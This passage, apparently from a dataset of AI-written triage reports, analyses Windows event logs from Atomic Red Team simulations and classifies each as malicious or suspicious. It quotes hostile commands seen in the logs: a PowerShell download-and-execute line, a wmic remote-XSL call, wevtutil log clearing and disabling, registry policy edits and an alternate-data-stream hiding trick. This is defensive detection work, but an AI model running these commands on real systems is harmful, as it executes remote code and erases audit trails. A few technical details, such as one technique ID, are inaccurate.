Upon analyzing the provided logs from different channels (Application, System, Security, Sysmon, and Windows PowerShell), several findings indicate potentially suspicious activities:

1. **Log Clearing Events:**
   - **System Logs:** Event ID 104 indicates that both System and Windows PowerShell logs were cleared by the user `admin_test` at the same timestamp (15:54:09).
   - **Security Logs:** Event ID 1102 shows that Security logs were also cleared by `admin_test` at the same time.

   Clearing logs, especially security-related ones, is often a tactic employed by malicious actors to conceal their activities. Since these log clearances occurred closely together and by the same user, this behavior is particularly suspicious.

2. **Process and Command-Line Activity:**
   - **Sysmon Logs:** 
     - The processes `wevtutil.exe` and `conhost.exe` were executed multiple times with command lines indicating actions likely associated with log manipulation (e.g., clearing logs from channels like Application, System, Security, and Windows PowerShell). The process `wevtutil.exe` is known for managing logs, and its execution pattern here appears coordinated and deliberate.
     - The execution of `cmd.exe` and `regsvr32.exe` with specific parameters, such as loading a DLL from a temporary directory, can be indicative of code execution, which might be benign or part of a testing script. However, this aligns with MITRE ATT&CK's T1218.010 for living-off-the-land binaries, adding another layer of suspicion.

3. **Command Execution:**
   - **Command Line Initiated Processes:** Analysis shows `whoami.exe` and `hostname.exe` executions through command lines, which may be used for reconnaissance purposes, depending on the context in which they're executed.

### Assessment:

Based on the available evidence, the activities recorded in these logs, particularly log clearance events and the execution of processes associated with log clearance and potential reconnaissance, suggest there is a high likelihood of suspicious and possibly malicious activity.

### Resolution:

- **SUSPICIOUS:** The logs contain activities that are not aligned with typical benign behavior and warrant further investigation. The repeated log clearance events, coupled with command executions described, indicate potentially malicious activity, but additional verification is required.

### Guidance on How to Proceed:

1. **User Verification:** Confirm the legitimacy and typical behavior of `admin_test`. Was this user expected to perform such actions within the timeframe?
2. **Review of Policies:** Evaluate the access policies and controls related to these log-clearing capabilities and adjust them if they appear too permissive.
3. **Endpoint and Network Monitoring:** Increase monitoring on `Server002` for any further unusual activities. Look out for any unauthorized changes or data exfiltration attempts.
4. **Audit Trail:** Conduct a thorough audit of other logs to identify any associated accounts, times, or indicators that may reveal further details about these activities.
5. **Incident Response:** If suspicions remain or further evidence suggests malicious activity, initiate incident response procedures to contain and remediate any potential threats.

The evidence suggests suspicious behavior that requires immediate and thorough investigation, but further context or forensic analysis would be necessary to confirm a malicious breach definitively."
Add Root Certificate to CurrentUser Certificate Store,"Upon careful examination of the provided Windows event logs, several key observations have been made that align with potential indicators of malicious activity:

1. **PowerShell Execution**: The PowerShell event logs show the execution of a command that involves downloading and executing a script from the internet. The specific command is:
   ```
   powershell.exe & {IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)}
   ```
   This command uses `Invoke-Expression` (IEX) to execute code retrieved from a URL using `Invoke-WebRequest` (IWR). The script comes from a URL associated with Red Canary's Atomic Red Team, which is a known repository for attack simulation tools. This could indicate benign security testing; however, automated downloads and script execution should be analyzed further to ensure it’s authorized.

2. **Event Log Clearing**: The System, Security, and PowerShell event logs are suspiciously cleared by a user `admin_test` almost simultaneously:
   - In the System log, EventID 104 indicates the System log was cleared.
   - In the Security log, EventID 1102 indicates the Security log was cleared.
   - EventID 104 in the System log for channel ""Windows PowerShell"" indicates the PowerShell log was cleared.

   Clearing logs, especially security and system logs, is highly indicative of an attacker attempting to cover their tracks.

3. **Sysmon Events**: There is significant use of `wevtutil.exe`, a utility for managing Windows event logs. It is being executed with the command line arguments:
   ```
   ""C:\\Windows\\system32\\wevtutil.exe"" cl <channel>
   ```
   This command directly clears the specified event log channels (such as Application, Security, System). This activity corresponds to the log clearing actions observed in the System and Security logs.

4. **Integrity Level and User Context**: The events are often executed in a high integrity context with administrative privileges by the user `SERVER002\\admin_test`. This level of access suggests that the actions were performed with considerable privileges, potentially part of a malicious privilege escalation or misuse.

5. **Microsoft Edge Update Usage**: The logs show legitimate Microsoft Edge Update activities. However, they appear to follow the suspicious PowerShell activity and might serve as a form of distraction or legitimate activity used to mask malicious operations. Without other indicators specific to the Edge Update process itself, these events do not arouse suspicion independently.

**Assessment and Conclusion**:
- The execution of PowerShell commands to download and execute remote scripts, combined with the clearing of event logs, strongly suggests malicious intent. The activity is consistent with attempts to execute potentially harmful code while subsequently erasing traces of such actions.
  
- Therefore, the resolution of this investigation would be classified as **MALICIOUS**.

**Guidance and Next Steps**:
1. **Immediate Response**: Isolate the system from the network to prevent further potential damage or data exfiltration.
   
2. **Forensic Investigation**: Conduct an in-depth forensic analysis of the system to uncover any payloads or additional indicators of compromise.

3. **Remediation**: Identify and remove malicious scripts or programs. Reinforce security configurations to prevent script execution from unauthorized or external sources.

4. **Review Permissions**: Examine and possibly revoke administrative access for the user `admin_test` until verified if legitimate activity aligns with user id actions.

5. **Monitoring and Detection**: Enhance monitoring for similar PowerShell and event log clearing activities across other systems in the environment.

6. **Awareness and Training**: Ensure staff are aware of the risks of executing unverified scripts, and the potential channels of executing privileged operations without oversight."
Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,"After analyzing the provided Windows event logs, I have identified both benign activities and signs that suggest potentially suspicious activities. Here is a detailed analysis of the events:

### Suspicious and Anomalous Behavior:
1. **PowerShell Usage**:
   - The use of PowerShell with a complex command involving `Invoke-ATHHTMLApplication`, potentially indicating an attempt to execute a script or application hidden within PowerShell. This is unusual and could point to an attempt to execute a script without clearly leaving traces (Sysmon Event ID 1 with PowerShell execution).
   
2. **Log Clearing Events**:
   - There are events indicating the clearing of multiple logs (Sysmon, Security, and Windows PowerShell logs), seen in System and Security event logs (Event IDs 104 and 1102). This activity is often associated with malicious actors trying to cover their tracks after a compromise.

3. **Wevtutil Usage**:
   - The `wevtutil.exe` command is being used to clear logs associated with important Windows Event channels. This is not a typical action performed by administrators and suggests an effort to clear event logs to hide activities.

### Indicators of Malicious Activity:
- The combination of PowerShell being used to potentially execute hidden scripts alongside wevtutil being used to clear logs is a strong indicator of potential malicious activity. These are tactics often used by attackers to perform and conceal unauthorized activities.

### Assessment:
Based on the above findings, the activities outlined in the logs are highly suspicious and indicative of potential malicious intent—specifically the use of PowerShell commands in an obfuscated manner and log clearance commands.

### Resolution:
- **Resolution: MALICIOUS**

Given the indications of potential malicious activity including log clearing and PowerShell misuse, it's clear that an unauthorized action took place. I recommend initiating a full security incident response to further investigate and contain potential threats. Steps should include checking for any unauthorized access or changes in sensitive systems, enhancing monitoring for any future log clearance activities, and ensuring the security posture is strengthened against similar techniques.
"
Disable Event Logging with wevtutil,"Upon reviewing the provided logs, there are several points of interest that warrant further analysis:

1. **Event ID 1102 (Security Log Cleared):** This event indicates that the audit logs in the security channel were cleared. This is a red flag because attackers often clear event logs to cover their tracks. The logs were cleared by a user account named `admin_test`.

2. **Usage of `wevtutil.exe`:** The `wevtutil.exe` command was used multiple times to clear the logs in different channels (Sysmon, System, and Security). Clearing logs in this manner is typically associated with malicious behavior, especially when done in quick succession.

3. **High Privileges Used by `admin_test`:** The user `admin_test` is observed to have used several high privilege rights such as `SeDebugPrivilege`, `SeBackupPrivilege` etc., which are typically needed for sensitive system tasks but could also be indicative of a targeted attack if used inappropriately.

4. **Usage of `cmd.exe` to Disable Event Logs:** The command `wevtutil sl ""Microsoft-Windows-IKE/Operational"" /e:false` with `cmd.exe` suggests an attempt to disable logging for IKE events, which could be an attempt to cover malicious access or data exfiltration activities.

5. **Time Discrepancies:** There are events related to time adjustment and services like `svchost.exe` interacting with the time service, possibly used to manipulate time stamps on logs or setup events. While not inherently malicious, when combined with other activities, it adds to the suspicion.

Based on the provided logs, the sequence of event log clearing and the disabling of specific log channels suggest unauthorized activities:

### Assessment:

- **Suspicion:** The clearing of logs by `admin_test` immediately followed by time-sensitive and privileged actions, such as time changes and disabling specific event channel logging, indicates potentially malicious activity. 

### Final Resolution:

- **MALICIOUS:** Given the clearing of logs and usage of high-level privileges to manipulate and disable logs, the actions recorded in these logs are consistent with tactics used in post-exploitation scenarios to evade detection.

### Recommended Actions:

1. **Immediate Remediation:**
   - Isolate the affected host to prevent any further potential spread or damage.
   - Change all passwords associated with the `admin_test` account and any other accounts showing unusual activity.
   - Conduct a full forensic investigation on `Server002` to determine the extent of the compromise.

2. **Further Investigation:**
   - Review other logging sources, including network traffic, to trace any potential data exfiltration or lateral movement.
   - Check for any scheduled tasks or startup scripts that might reinstate malicious activities.

3. **Continuous Monitoring:**
   - Enable more stringent log monitoring and retention policies to prevent future unauthorized log deletions.
   - Consider implementing a security information and event management (SIEM) system to better track and correlate similar events in real-time.

By following these actions, you ensure both immediate containment of the threat and ongoing protection against similar incidents."
System Binary Proxy Execution - Wlrmdr Lolbin,"Upon reviewing the provided Windows event logs, several elements raise potential concerns worthy of further analysis. Here's a detailed breakdown:

1. **Sysmon Logs**:
   - Frequent invocation of `wevtutil.exe` (Eventing Command Line Utility) to clear event logs (System, Application, Security, Windows PowerShell). The command-line used is `""C:\\Windows\\system32\\wevtutil.exe"" cl *`. This may signify log tampering or an attempt to hide activities, which is a common behavior post-compromise.
   - Execution of `powershell.exe` with a command that starts `calc.exe` via a complex script. This could signify an attempt to execute arbitrary code, although `calc.exe` is a benign application used in testing or as a proof of capability demonstration in malicious contexts.

2. **System Logs**:
   - Event ID 104 is logged multiple times, indicating the logs for different channels being cleared (`System` and `Windows PowerShell`). This aligns with the observed behavior in Sysmon logs.

3. **PowerShell Logs**:
   - The PowerShell commands resemble attempts to execute system functions through potentially obfuscated or indirect methods. The sequence involving launching `calc.exe` via `wlrmdr.exe` could imply an attempt to obfuscate command execution, which is suspicious, though not overtly malicious in impact.

4. **Security Logs**:
   - Logon and privilege assignments seem typical, but the clearing of the Security log (Event ID 1102) is particularly concerning as it is a strong indicator of an attempt to cover tracks.

The combined evidence suggests:
- **Suspicious Activity**: The clearing of logs and the command execution paths are suspicious. These might not definitively prove malicious action but indicate the potential for logging tampering and evasion tactics. 
- **Potential Threat or Risk**: Continued monitoring and a more in-depth investigation are necessary to determine if this leads to a compromise or is part of a benign, but aggressive script execution or cleanup routine.

### Resolution:
**SUSPICIOUS** - The logs display activity that suggests the potential for malicious intent, particularly due to log clearing via `wevtutil.exe` and non-standard use of PowerShell. Further analysis on the context and origin of these activities, as well as a thorough review of any changes in system configuration or unauthorized access, is recommended to rule out malicious actions. Consider reviewing network logs, user activity, and possibly utilizing an incident response team to validate these findings and ensure system integrity."
Windows - Modify file last modified timestamp with PowerShell,"Upon analyzing the provided logs, the following observations and assessments were made:

### Windows PowerShell Log

1. **PowerShell Commands**: 
   - The command executed appears to be using PowerShell to modify file timestamps to ""01/01/1970 00:00:00"". The script references a file named `T1551.006_timestomp.txt` within a directory linked to Atomic Red Team, a known open-source project that provides tests for security controls. This indicates a potential simulation of actual attack techniques rather than an actual attack, yet it raises concern due to its nature.

### Sysmon Log

2. **Process Execution**: 
   - Sysmon logs show the execution of PowerShell around the same time as recorded in the PowerShell logs, confirming the timestamping activity.
   - Additionally, numerous instances of `wevtutil.exe` were recorded. This tool is often used for clearing event logs, a common technique used in malicious activities to erase tracks.
   - Multiple logs showing `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` are typically benign processes but are involved in suspicious command history and log clearing processes.

3. **Cleared Logs**: 
   - The logs show successive clearing of System, Security, and Windows PowerShell logs by `wevtutil.exe`, corroborated by Event IDs in System and Security logs. Log clearing is highly suspicious as it is indicative of attempting to cover malicious activity.

### System Log

4. **Log Clear Events**: 
   - Event ID 104 indicates that system event logs were cleared by the user `admin_test` without a backup path, which aligns with the presence of `wevtutil.exe` in Sysmon logs.

### Security Log

5. **Security Log Clearance**: 
   - The security logs show Event ID 1102, which indicates the security log being cleared, again indicative of an attempt to hide actions.

### Other Observations

6. **User Account and Privileges**: 
   - The user `SERVER002\\admin_test` appears consistently in the execution of suspicious commands and log clearance, suggesting either this account was compromised or it is being used improperly.

### Assessment

The combined features of timestamp alteration on files, execution of `wevtutil.exe` for log clearance, and actions conducted under a potentially compromised user account (`admin_test`) strongly suggest an attempt at concealing illegitimate activities. 

### Resolution

- **Resolution**: **MALICIOUS**

### Guidance

Considering these activities:
1. **Immediate Investigation**: Investigate the `admin_test` account for unauthorized access or compromise.
2. **Incident Response**: Initiate incident response procedures to determine the extent of the compromise, if any, and mitigate potential damage.
3. **Log and Data Forensics**: Forensic analysis should be deployed on system logs and changes to determine other possible malicious actions undertaken.
4. **Security Audit**: Conduct a security audit across similar systems and accounts to determine if this behavior is isolated or part of a broader issue.
5. **User Awareness and Access Management**: Strengthen user training about security and tighten access controls to prevent future unauthorized access.

These findings call for an urgent, in-depth review of security measures to ensure integrity and proper recovery of potentially compromised components of the network."
WMIC bypass using remote XSL file,"Upon reviewing the provided logs, several factors suggest potentially suspicious activity:

1. **Event Log Clearing**:
   - The System, Security, and Windows PowerShell event logs were cleared by the user `SERVER002\admin_test`. This is indicated by EventID 104 in the System log for System and Windows PowerShell channels, and EventID 1102 for the Security log. The clearing of event logs can be indicative of malicious activity as attackers may clear logs to cover their tracks.

2. **Execution of Command-line Utility**:
   - Multiple instances of `wevtutil.exe`, a command-line utility used to manage Windows event logs, were executed. This includes commands to clear logs (denoted by `cl`). These actions immediately preceded or occurred in conjunction with the event log clearing activities, further raising suspicion.

3. **Unusual Command Usage**:
   - There is a Sysmon EventID 1 that shows `cmd.exe` being executed with the command `wmic process list /FORMAT:""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl""`. This command retrieves a WMIC format definition from the internet, which is potentially unusual and can be associated with malicious activities or reconnaissance.

4. **Time Change Events**:
   - There are kernel-general event logs (EventID 4616) indicating time changes on the system. While not inherently malicious, unauthorized time changes could be used to evade detection in some logging systems.

5. **Restricted Logon Sessions**:
   - In the Security logs, an NTLM logon (EventID 4624) from a remote address is noted without a tied process, which can sometimes be monitored for attempts to access the system remotely.

**Conclusion**:
The combination of log clearing, suspicious command-line activities, and the retrieval of scripts over the network suggests the presence of potentially malicious activities. The intent to clear logs is often associated with efforts to hide unauthorized changes or activities.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately perform a containment strategy to isolate the affected host.
- Conduct a deeper forensic investigation to ascertain the scope of the compromise, including analyzing network traffic, registry, filesystem changes, and memory dumps from the time of these logs.
- Change all credentials associated with the compromised accounts and implement additional monitoring for further unusual activities.
- Follow up with a comprehensive review of security policies and the deployment of enhanced endpoint detection and response tools if not present."
DisallowRun Execution Of Certain Applications,"The provided logs show various activities on the Windows host ""Server002"". Here's a detailed analysis of notable entries:

1. **Command-Line Utility Usage (wevtutil.exe)**:
    - wevtutil.exe is used multiple times with the `cl` (clear) parameter targeting several logs: Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell. The frequent execution of wevtutil commands to clear logs is anomalous behavior and can indicate attempts to cover tracks after potentially malicious activities.

2. **Registry Modifications via cmd.exe**:
    - The logs show the execution of a command via `cmd.exe` that modifies registry policies to disallow the execution of `regedit.exe` and `cmd.exe`. This behavior is suspicious as it modifies system policies to potentially restrict administrative tools, which may indicate an intention to hinder administrative oversight or restrict further analysis.

3. **Log Clearing Events**:
    - Application Log: An entry showing the clearing of the `System` and `Windows PowerShell` logs by the user ""admin_test"". 
    - Security Log: The clearing of the Security log is noted, an action usually taken to eliminate evidence of malicious activity within the system’s security logging.

4. **Process Execution**:
    - Multiple system processes are started where ""admin_test"" consistently has a high integrity level, noting powerful access that can be leveraged for malicious activity.

### Assessment:
- The combination of frequent log clearing, registry modifications to disallow critical utilities, and the usage of high integrity processes under the user's admin_test account suggests an attempt to conduct activities without detection and hinder further investigation.

### Resolution:
- **MALICIOUS**: Based on the evidence of log clearing, registry modifications, and potential attempt to cover tracks, these logs are indicative of malicious activity.

### Guidance:
1. Immediately isolate the affected machine (Server002) to prevent further unauthorized activities.
2. Conduct a comprehensive forensic analysis to identify the extent of compromise and gather evidence.
3. Reset or investigate the credentials and permissions of the ""admin_test"" account and other potentially impacted users.
4. Review and reinforce event logging practices to ensure resilience against log tampering.
5. Consider conducting a broader security assessment to identify any additional threats and potential entry points exploited by the attackers."
Mimic Ransomware - Enable Multiple User Sessions,"Upon analyzing the provided logs, there are several points of interest that stand out:

1. **Clearing of Event Logs**: 
   - The security logs show multiple instances of Event ID 1102, which indicates that the ""Security"" logs were cleared. This action was conducted by an account named ""admin_test"" (`SubjectUserName"":""admin_test""`). Clearing event logs can be an attempt to cover the tracks of potentially malicious activities.

2. **Registry Modification**:
   - There is a suspicious command executed as seen in this Sysmon entry:
     ```
     ""CommandLine"":""\""cmd.exe\"" /c reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f""
     ```
     This command modifies the Windows registry to allow multiple Terminal Services sessions per user, which could be used for lateral movement or maintaining persistence.

3. **Wevtutil.exe Usage**:
   - The usage of `wevtutil.exe` is observed multiple times in the logs. While `wevtutil` is a legitimate Windows utility for managing event logs, frequent or unexpected usage—especially when tied to log clearing or from unusual directories—can be suspect.

4. **Consistency Across Logs**:
   - Consistent usage of `conhost.exe` alongside the `wevtutil.exe` and command prompt executions suggests automation or scripting to perform the tasks, which might include log clearance or process manipulation.

5. **Time Discrepancies**:
   - There are events involving time changes (`EventID 4616`). Such changes might not be directly malicious, but abrupt time changes can sometimes be part of obfuscation techniques.

Given these observations, I would classify the nature of activities within these logs as **SUSPICIOUS**. 

### Guidance:
- **Conduct a Detailed Investigation**: An in-depth forensic analysis should be conducted to determine who initiated the log clearance and why.
- **Review Access Logs and User Activities**: Verify the legitimacy of activities performed by the ""admin_test"" user and correlate with any known scheduled jobs or maintenance activities.
- **Endpoint Protection Sweep**: Check the system with up-to-date anti-malware solutions to ensure there is no malicious software present.
- **Alert IT-Security Team**: Ensure the security operations center is aware and sets up monitoring for any similar activities across other hosts.
- **Review Group Policies**: Verify if any GPO or similar configurations could have facilitated these changes.
- **Implement Additional Monitoring**: Increase monitoring of log management activities and registry changes to early detect potentially similar activities in the future.

This suspicious classification stems from the registry modifications, the clearing of security event logs, and repeated invocation of `wevtutil.exe`, which merits a closer evaluation to ensure system integrity and security."
Rundll32 ieadvpack.dll Execution,"Upon analyzing the provided set of logs from various sources on the Windows host, the following observations and anomalies were noted:

1. **Process Execution Pattern:**
   - Several instances of `wevtutil.exe` were observed in the Sysmon logs clearing different event logs such as Sysmon, Application, System, Security, and Windows PowerShell. This action is typically associated with an attempt to remove evidence of other activities, which is suspicious behavior.
   - `cmd.exe` executed a command to run `rundll32.exe` with specific arguments pointing to a temporary directory under `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.011`. This pattern matches MITRE ATT&CK techniques for defense evasion (T1218.011), which suggest execution using the `rundll32` binary with command-line arguments that manipulate INF files.

2. **Log Clearing Events:**
   - There are events indicating the clearing of critical logs. Specifically, we see EventID 104 indicating the `System` and `Windows PowerShell` logs being cleared, and EventID 1102 indicating that the `Security` log was cleared. This behavior is highly indicative of someone trying to cover their tracks after conducting suspicious or malicious activity.

3. **Atomic Red Team Artifact:**
   - The presence of `AtomicRedTeam` in the file path used by `cmd.exe` and `rundll32.exe` suggests this might be a simulation of adversarial activity. Atomic Red Team is a framework for testing security systems by simulating behaviors of known threats.

4. **Use of High-Integrity Privilege:**
   - The logs show processes running with high integrity levels and administrative privileges, further indicating potential unauthorized access and the possibility of privilege escalation.

5. **Excessive Use of `conhost.exe`:**
   - There are numerous executions of `conhost.exe`, typically associated with command-line operations. While this by itself isn’t necessarily suspicious, when combined with other findings, it could be indicative of scripting or automation of unauthorized tasks.

**Assessment and Resolution:**

Considering the above findings, especially the clearing of event logs and the use of suspicious command-line executions indicative of known adversarial techniques:
- The logs clearly demonstrate activities aligned with malicious intentions or a security test involving realistic adversarial behavior.

**Resolution: MALICIOUS**

**Guidance:**
1. **Immediate Action:**
   - Investigate any unauthorized user actions by `admin_test` or determine if these were performed as part of a security test.
   - Review the system and network for additional evidence of compromise or lateral movement.
   - Ensure comprehensive logging is immediately restored and protected from unauthorized deletions.

2. **Forensic Investigation:**
   - Conduct a more in-depth investigation into system changes, especially focusing on configurations and the presence of new files and executables.
   - Use threat intelligence feeds to cross-reference the hashes and patterns observed.

3. **Remediation:**
   - If unauthorized activity is confirmed, isolate affected systems, reset credentials, and audit permissions.
   - Apply additional security measures like enhanced logging, monitoring, and regular security audits.

4. **Awareness and Training:**
   - Ensure proper training and awareness for teams involved in handling security systems to recognize signs of both simulated tests and real adversarial actions."
Create Hidden Directory via $index_allocation,"Upon reviewing the provided Windows event logs, several activities stand out, raising suspicions of potential malicious behavior. Here is a detailed analysis:

### Observations:
1. **Event Log Clearing (Security and System Logs):**
   - **Security Log Clearing** (`EventID 1102`): The `admin_test` user cleared the security logs on `2024-10-28 at 13:58:23`. Clearing security logs is a significant indicator that an attacker may be trying to cover their tracks.
   - **System Log Clearing** (`EventID 104`): Similarly, the system logs were cleared by the same user at approximately the same time.

2. **Suspicious Command Execution (Sysmon Logs):**
   - An execution of `cmd.exe` with a peculiar command involving directory creation and file writing to a very irregular path using NTFS alternate data streams (`EventID 1`, `TimeCreated: 2024-10-28 at 13:58:32`). This is a known tactic to hide data. The command `md %temp%\...$.......::$index_allocation & echo too many secrets > %temp%\...$.......::$index_allocation\secrets.txt` is an obfuscation attempt that implies data hiding, which is typical of malicious activities.

3. **Multiple `wevtutil` Executions:**
   - The command-line tool `wevtutil` was used multiple times to clear various logs, including `Sysmon`, `Application`, and `System` event logs by the `admin_test` user (`EventID 1`, executed multiple times). This tool is often leveraged by attackers to manipulate event logs.

4. **Unusual Time Change (System Logs):**
   - There are logs indicating system time changes (`EventID 1` from `Kernel-General`) around the same time as the log changes. Adjusting time can be used to confuse audit trails.

### Assessment:
The combination of actions observed, including the clearing of event logs and the execution of suspicious commands with `cmd.exe` involving NTFS alternate data streams, are indicative of malicious intent. The logs show clear signs of activities likely conducted to conceal traces of an unauthorized use or to hide additional malicious actions performed on the system.

### Recommendation:
- **Resolution: MALICIOUS** - The log entries present a strong case for malicious activity. It is advisable to proceed with an in-depth forensic investigation on Server002. Specifically:
  - Conduct a full analysis of alternate data streams on the file system.
  - Perform a root cause analysis to determine how `admin_test` user credentials were utilized, potentially indicating compromised credentials.
  - Immediately review and secure any other systems that the `admin_test` account has access to and reset credentials.
  - Implement continuous monitoring and auditing to prevent future occurrences.

The given indicators suggest further action is crucial to prevent any further data compromise or potential damage to the system and network infrastructure."
Hide Windows Clock Group Policy Feature,"The log entries provided include events from Windows Event Logs, Sysmon, and other system components that suggest potential suspicious activity. Here's a detailed analysis of these logs:

### Analysis:

1. **Clearing of Logs:**
   - **Security Log EventID 1102**: This indicates the security logs were cleared. The user `admin_test` performed this action. Cleared logs can be an indicator of attempts to hide tracks.
   - **System Log EventID 104**: Two log clearing events were recorded, one for the ""System"" channel and another for the ""Windows PowerShell"" channel. Both are executed by the `admin_test` user.
   - Clearing event logs without a clear operational requirement is considered suspicious and potentially malicious as it is a common step for attackers attempting to cover their tracks.

2. **Sysmon Logs:**
   - Multiple executions of `wevtutil.exe`: The `wevtutil.exe` command was executed with the intention to clear logs from various channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`). This activity is aligned with efforts to erase evidential logs and hinders incident response.
   - **Command-Line Usage of `cmd.exe`, `reg.exe`:** Execution of `cmd.exe` with the command `reg add` to modify the registry key for hiding the clock can be seen as an attempt to change the system's configuration, which may be unauthorized.
   - Processes like `whoami.exe`, and `HOSTNAME.EXE` were executed, which generally are used for reconnaissance purposes.

3. **Application and System Services:**
   - The execution of multiple Edge Update binaries (`MicrosoftEdgeUpdate.exe`) and associated components seem to be legitimate product update processes. However, the focus should be directed towards activities related to the admin user as seen in logs.

4. **Potential Reconnaissance and Persistence:**
   - Commands such as ""whoami"" and changes to visual system policies like hiding the clock suggest possible reconnaissance and attempts to maintain persistence or manipulation of system settings to evade detection.

### Assessment:

The combination of the above activities – log clearance, registry modification, and possible reconnaissance tools usage indicates a concerted effort to obfuscate actions on the host and maintain persistence. These actions are typical markers of malicious activity rather than routine administrative maintenance.

### Resolution:

- **MALICIOUS:** The logs contain activities indicative of an intentional attempt to hide actions on the host, manipulate system behavior, and possibly perform reconnaissance - clear strategies aligned with malicious intent.

### Guidance:

- Immediately isolate the affected host to prevent further actions by the actor.
- Conduct a full forensic investigation to recover potentially malicious files, review other systems for similar activity, and assess any impact.
- Consider resetting credentials for all administrative users to prevent further unauthorized access.
- Review security controls and implement stricter monitoring and incident response protocols to detect and mitigate similar attacks in the future.
- Engage with legal and compliance teams if necessary, as log tampering might have broader implications depending on the organization’s regulatory environment."
WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,"Here's a detailed analysis of the provided Windows event logs:

### Suspicious or Anomalous Behavior:

1. **Event Log Clearance**:
   - From the System logs, there are multiple events (Event ID 104) indicating the clearing of logs (`System`, `Windows PowerShell`).
   - In the Security log, an event (Event ID 1102) indicates the clearing of the security log as well. The user involved in these actions is `admin_test`.

2. **Suspicious Command Execution**:
   - Sysmon logs show multiple instances of the `wevtutil.exe` command being used to clear logs for various channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Windows PowerShell`). Clearing logs is often indicative of an attempt to cover tracks.

3. **Unusual PowerShell Activity**:
   - There are PowerShell events showing the execution of commands that install an MSI package via `Invoke-CimMethod`. The MSI is located in a directory path associated with Atomic Red Team, which could be used for security testing or training but also resembles a tactic used in red team exercises to simulate adversary behavior.
   - Another PowerShell instance runs with `-nop` (no profile) and a custom action suggesting automation or an obfuscated script running.

4. **Installation of Non-Standard Software**:
   - The Application logs indicate the installation of a package named ""Atomic Red Team Test Installer,"" which might be related to testing or training, but in a different context, could also be suspect if it's unexpected or unknown.

5. **EdgeUpdate Service Stoppage**:
   - The Application logs reflect multiple stops and starts of the `EdgeUpdate` service. While this could be part of normal updates, the timing coincides with other suspicious activities, which merits further scrutiny.

### Assessment:

The logs reveal activity that is beyond typical benign operations, specifically in regards to:

- **Log Clearing**: The clearing of event logs across several key channels signifies an attempt to conceal actions, which strongly suggests malicious or unauthorized activity.
- **PowerShell and MSI Installation**: The usage of PowerShell scripts to install an MSI linked with ""Atomic Red Team"" highlights potentially risky activity, as this toolkit is often employed in adversary simulations, thus these actions need further context to verify intent.
- **Repeated Service Manipulation**: The stoppage and starting of services could be related to updates but due to the timing and context, it should be analyzed further.

### Threats and Risks Identified:

- Unauthorized or malicious log clearing can hide evidence of more severe breaches or internal threats.
- Execution of scripts like those found in red team tools in a production environment without known authorization or purpose could indicate either a security test or a breach simulation in progress without IT/security knowledge.

### Guidance on How to Proceed:

- **Immediate Investigation**: Perform a full investigation to confirm if these actions were part of sanctioned testing or red team activities. If they weren't authorized, it indicates potential malicious activity.
- **Access Review**: Verify the legitimacy and intent of activities performed by the user `admin_test`.
- **Security Monitoring**: Enhance monitoring around key systems, focusing on PowerShell executions, MSI installations, and any form of log file manipulation or clearing.
- **Incident Response**: If no legitimate reason for these activities is present, initiate incident response procedures to contain and analyze potential threats systematically.

### Final Resolution:

Given the presence of unauthorized or suspicious log manipulation, combined with PowerShell commands linked to possibly offensive actions, the activity captured in these logs is best categorized as:

**SUSPICIOUS** - The logs contain activities that warrant further investigation to determine the legitimacy."
Activate Windows NoPropertiesMyDocuments Group Policy Feature,"Upon reviewing the provided event logs, the following observations can be made:

1. **Event Log Clearing:**
   - **System, Security, and PowerShell Logs Cleared:** There are consistent activities where event logs were cleared by `admin_test`. Event logs being cleared (`EventID 104` and `EventID 1102`) can be a significant indicator of malicious activity, as it may suggest an attempt to cover tracks after unauthorized actions. This was done using `wevtutil.exe`, which is a legitimate Windows tool that can be misused for this purpose.

2. **Svchost.exe and Time Change:**
   - There is an adjustment in system time (`EventID 4616`) executed by `svchost.exe`. Altering system time may be part of an evasion technique, although such actions can be benign if part of system maintenance or updates. However, in conjunction with log clearing, this raises a red flag.

3. **Suspicious Command Execution:**
   - A command was executed to modify the Windows registry: `cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f`. This command changes system policies which may be used to alter user permissions or configurations.

4. **Frequent Execution of System Utilities:**
   - Known utilities like `whoami.exe`, `hostname.exe`, `cmd.exe`, and `reg.exe` were seen executing. These tools are often used for basic system interrogations and are not inherently malicious, but their usage pattern and timing could be suspicious when combined with the observed log clearing.

5. **Microsoft Edge Update Activities:**
   - Numerous Microsoft Edge update processes are running (`MicrosoftEdgeUpdate.exe`). While these can be legitimate update activities, attackers occasionally mimic such processes. The processes were executed under `NT AUTHORITY\SYSTEM`, which is consistent with expected behavior for legitimate updates.

6. **Administrative Privilege Usage:**
   - The `user` associated with these actions is `SERVER002\admin_test`, operating with high integrity levels. The use of an administrative account is significant and could indicate an insider threat or compromised account.

**Assessment & Resolution:**
Given these logs, the user `admin_test` cleared multiple critical event logs in rapid succession, which is highly suspicious, especially in a short time frame without a clear operational reason. Coupled with unusual registry edits and system time changes, these activities resemble well-known techniques to cover illicit actions.

The logs should be treated as **SUSPICIOUS**. While they do not provide direct evidence of a breach, the log clearing and registry modifications deserve further investigation. It would be prudent to:
- Perform a detailed analysis of `admin_test` activities around the time of these logs.
- Check for any other indicators of compromise on this host.
- Review access controls and refine monitoring to detect similar future activities.
- Reassess the security of privileged accounts and establish a baseline for legitimate log cleaning tasks."
Msiexec.exe - Execute the DllRegisterServer function of a DLL,"Upon analyzing the provided Windows event logs, the following observations and assessments can be made:

### Suspicious or Anomalous Behavior
1. **Event Log Clearing Activities**:
   - The logs show multiple instances of event log clearing activities (Event ID 104 and 1102). The `wevtutil.exe` command is used to clear logs in the `Sysmon`, `System`, `Security`, and `Windows PowerShell` channels sequentially.
